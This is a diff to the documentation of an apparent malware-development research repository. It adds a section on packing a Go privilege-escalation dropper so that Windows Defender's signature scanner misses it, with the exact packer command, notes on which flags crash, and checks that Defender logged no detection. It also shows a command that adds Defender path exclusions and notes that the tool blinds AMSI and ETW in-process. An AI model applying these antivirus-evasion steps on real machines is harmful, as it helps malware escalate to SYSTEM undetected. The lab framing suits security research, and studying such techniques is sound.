@@ -32,9 +32,10 @@ control.
 7. [Reading the results](#7-reading-the-results)
 8. [Detection & forensics — what defenders see](#7-bis-detection--forensics--what-defenders-see)
 9. [Customization — orchestrator flags](#8-customization--orchestrator-flags)
-10. [Troubleshooting](#9-troubleshooting)
-11. [Repository layout](#10-repository-layout)
-12. [The helpers this command demonstrates](#11-the-helpers-this-command-demonstrates)
+10. [Defender bypass via dropper packing](#8-bis-defender-bypass-via-dropper-packing)
+11. [Troubleshooting](#9-troubleshooting)
+12. [Repository layout](#10-repository-layout)
+13. [The helpers this command demonstrates](#11-the-helpers-this-command-demonstrates)
 
 ---
 
@@ -224,18 +225,28 @@ New-Item -ItemType Directory -Force -Path C:\Users\Public\maldev | Out-Null
 Copy-Item C:\maldev\privesc-e2e.exe C:\Users\Public\maldev\privesc-e2e.exe -Force
 ```
 
-> **Defender note.** If the target has Defender active, it may
-> quarantine `privesc-e2e.exe` and/or the planted `hijackme.dll`.
-> The orchestrator's `evasion.preset.Aggressive` blinds AMSI +
-> ETW in-process, but the *on-disk* signature is still scannable.
-> For demo/research purposes add a Defender exclusion:
+> **Defender note.** If the target has Defender active and you
+> deployed the **unpacked** orchestrator from §2.0, Defender may
+> match the Go binary on disk and quarantine it before exec.
+> `evasion.preset.Aggressive` blinds AMSI + ETW *in-process*, but
+> the on-disk signature is still scannable.
 >
-> ```powershell
-> Add-MpPreference -ExclusionPath C:\Vulnerable\,C:\Users\Public\maldev\,C:\ProgramData\maldev-marker\
-> ```
+> Two options, in order of preference:
 >
-> Skip this on a target where you're testing the evasion stack
-> itself.
+> 1. **Pack the dropper** — break the on-disk signature so
+>    Defender's signature scanner has nothing to match. This is
+>    the recommended path; see [§8 bis — Defender bypass via
+>    dropper packing](#8-bis-defender-bypass-via-dropper-packing)
+>    for the exact `cmd/packer` invocation that has been verified
+>    end-to-end with Defender real-time protection ON.
+>
+> 2. **Add a Defender exclusion** — pragmatic for a research
+>    session where you're testing some OTHER part of the chain
+>    and don't want Defender to be a variable:
+>
+>    ```powershell
+>    Add-MpPreference -ExclusionPath C:\Vulnerable\,C:\Users\Public\maldev\,C:\ProgramData\maldev-marker\
+>    ```
 
 ### 2.4 Sanity-check the wired-up state (elevated PowerShell)
 
@@ -745,6 +756,73 @@ You launch the orchestrator at §2.6. Its CLI surface:
 
 ---
 
+## 8 bis. Defender bypass via dropper packing
+
+Stock `privesc-e2e.exe` is an unpacked 12 MiB Go binary —
+Defender's signature scanner picks the static-import patterns out
+of the IAT (`evasion.amsi.*`, scheduled-task APIs, packer.*) and
+the binary gets quarantined on disk before its first instruction
+runs.
+
+The repo ships `cmd/packer` precisely for this: SGN-encode the
+`.text` section so the on-disk signature differs from any known
+hash AND the IAT-discoverable strings live encrypted at rest, then
+emit a tiny stub that decrypts back in-process at startup before
+jumping to the original Go entry point. The on-disk bytes are
+unrecognisable to any static signature, the runtime behaviour is
+preserved.
+
+### What works on the 12 MiB Go dropper
+
+Verified end-to-end with Defender real-time protection ON, no
+exclusions, lowuser → SYSTEM chain reaching STRONG verdict:
+
+```bash
+# Build the orchestrator first per §2.0, then pack it:
+go run ./cmd/packer pack \
+    -in privesc-e2e.exe \
+    -out privesc-e2e-packed.exe \
+    -format windows-exe \
+    -rounds 3
+```
+
+Deploy `privesc-e2e-packed.exe` AS `privesc-e2e.exe` on the
+target — the orchestrator side of §2.3 stays unchanged.
+
+### What does NOT work (yet) on the 12 MiB Go dropper
+
+| Flag | Why it breaks |
+|---|---|
+| `-compress` | LZ4 inflate at runtime collides with Go's section-layout introspection — packed binary crashes with `STATUS_ACCESS_VIOLATION` (`0xC0000005`) before `main()` |
+| `-randomize` | Phase-2 section renaming breaks Go's runtime PEB walk for `.text`/`.gopclntab` lookup — same access-violation profile |
+| `-antidebug` | Use only on bare-metal targets. On any hypervised host (KVM / Hyper-V / VMware) the RDTSC ↔ CPUID delta in the slice-5.6 stub trips on VMEXIT — see §9 |
+
+Smaller Go binaries (the `pe/packer/testdata/winhello.exe`
+fixture, 1.6 MiB) survive the full Mode-3 pipeline
+(`-compress -randomize -antidebug`) without runtime breakage. The
+limit on the 12 MiB orchestrator is a known constraint of the
+packer's interaction with Go's runtime introspection on large
+binaries.
+
+### Verification on the target
+
+```cmd
+:: Hash of the deployed binary — should NOT match the unpacked
+:: hash you have on the operator host.
+certutil -hashfile C:\Users\Public\maldev\privesc-e2e.exe SHA256
+
+:: Defender saw the file but did not flag it.
+powershell -Command "Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 10 -EA SilentlyContinue | Where-Object { $_.Message -match 'privesc-e2e' } | Format-List TimeCreated,Id,Message"
+:: → empty (no detection event) is the success signal
+
+:: The packed binary launches AS lowuser and produces marker.
+:: (Skip on-disk hash check by Defender via Get-MpThreatDetection.)
+powershell -Command "Get-MpThreatDetection -EA SilentlyContinue | Where-Object { $_.Resources -match 'privesc-e2e' }"
+:: → empty
+```
+
+---
+
 ## 9. Troubleshooting
 
 Read symptom column first; if your row matches, the right column
@@ -753,7 +831,7 @@ is the proven fix.
 | Symptom | Cause | Fix |
 |---|---|---|
 | `Erreur : Le nom d'utilisateur ou le mot de passe est incorrect` (schtasks /RP) | password contains shell-special chars (`!`, `%`, `"`, `^`) | use only `[A-Za-z0-9]` for the lowuser password |
-| `Impossible de terminer l'opération, car le fichier contient un virus` when running the orchestrator | Defender flagged `privesc-e2e.exe` on disk before exec | add a Defender exclusion for `C:\Users\Public\maldev\` and `C:\Vulnerable\` (see the Defender note after §2.3) |
+| `Impossible de terminer l'opération, car le fichier contient un virus` when running the orchestrator | Defender flagged `privesc-e2e.exe` on disk before exec | preferred: pack the dropper per [§8 bis](#8-bis-defender-bypass-via-dropper-packing); workaround: add a Defender exclusion for `C:\Users\Public\maldev\` and `C:\Vulnerable\` (see the Defender note after §2.3) |
 | `Le mappage entre les noms de compte et les ID de sécurité n'a pas été effectué` (icacls) | non-English Windows rejects English principal names | use SIDs: `*S-1-1-0` not `Everyone`, `*S-1-5-32-545` not `Users` — §2.2/§2.3 already do this |
 | `runas /user:lowuser …` says wrong password | `Set-LocalUser` SAM password representation differs from what `runas`/schtasks expect on some Win10 builds | re-run `net user lowuser MaldevLow42x` from elevated PowerShell — §2.2 does both `Set-LocalUser` AND `net user` for this reason |
 | orchestrator exits 1 immediately with no output, no breadcrumbs | binary too fresh — Defender SmartScreen blocked first execution | add the exclusion above, or run `Unblock-File C:\Users\Public\maldev\privesc-e2e.exe` first |
